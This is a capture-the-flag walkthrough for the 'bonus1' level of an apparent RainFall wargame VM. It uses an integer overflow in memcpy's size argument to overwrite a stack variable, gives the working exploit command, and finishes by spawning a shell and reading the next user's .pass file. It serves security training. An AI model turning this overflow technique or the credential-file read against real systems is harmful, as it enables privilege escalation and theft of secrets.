# Walkthrough

We decompile the `bonus1` binary with dogbolt.

```c
int main(int argc, const char **argv, const char **envp)
{
  char dest[40]; 
  int n; 

  n = atoi(argv[1]);
  if ( n > 9 )
    return 1;
  memcpy(dest, argv[2], 4 * n);
  if ( n == 1464814662 )
    execl("/bin/sh", "sh", 0);
  return 0;
}
```
Our goal is to set the value of `n` at `1464814662` while passing something something smaller than 9 (strictly).
To do that, we will make use of the `memcpy` function between the two `n` checks. 

We disassemble main, we see that the address being checked is `esp+0x3c`:
```
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
=> 0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
```

The start value of the stack pointer is `0xbffff760`, if we add `0x3c` it's now `0xbffff79c`.
```
(gdb) i r $esp
esp            0xbffff760	0xbffff760
```
First, let's check that in GDB:
```
(gdb) b *0x08048478
Breakpoint 2 at 0x8048478
(gdb) run 9 AAAABBBBCCCCDDDD
Breakpoint 2, 0x08048478 in main ()
(gdb) set *(int *)(0xbffff79c) = 1464814662
(gdb) c
Continuing.
process 4855 is executing new program: /bin/dash
$ whoami
bonus1
```
Now, we need to use `memcpy` to write `1464814662`, "WOLF", at `esp + 0x3c`. 

Upon fiddling with the programme, you soon realise that 9 isn't enough to write at the desired memory address. Thus, we need to find a way around, overflowing an int, and taking advantage of the cast in `size_t` when `memcpy` is called.

To test it, I have made a little program from the source code:
```c
#include <stdlib.h>
#include <stdio.h>

int main(int ac, char **av) {
  int n; 

	n = atoi(av[1]);
	if ( n > 9 ) {
		printf("Nope\n");
		return 1;
	}
	printf("%d\n", n);
	printf("%zu\n", 4 * (size_t)n);
	if ( n == 1464814662 )
		printf("Passed\n");
	return 0;

}
```
**Compile and it execute it on your VM, NOT YOUR COMPUTER or you'll have different results like I had and bang your head on your desk**:
Results on my computer (OSX Intel 64-bit):
```
➜  rainfall ./test -2147483647
-2147483647
18446744065119617028
```
Results on the VM (Debian 32-bit):
```
bonus1@RainFall:~$ ./test -2147483647
-2147483647
4
```
The way memory and functions work can vary a LOT depending on the implementation of a function, endianess, system type (32, 64 bit)...


Using GDB, if you break at `memcpy`, you can look at ESP:
```
(gdb) x/20x $esp
0xbffff740:	0xbffff754	0xbffff95a	0x00000028	0x080482fd
0xbffff750:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff760:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff770:	0x41414141	0x41414141	0x574f4c46	0x8000000a
0xbffff780:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
```
Hence, we can compute $esp + 3c_{16} = bffff77c_{16}$, and our buffer start at `0xbffff754`.
$bffff77c_{16} - bffff754_{16} = 40_{10}$

Thus, we need 40 for the padding and 4 for the string "WOLF".

Using that program, we see that `-2147483637` gives us satisfactory:
```
bonus1@RainFall:~$ ./test -2147483637
-2147483637
44
```

Now, we craft the payload and execute it:
```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "FLOW"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
```
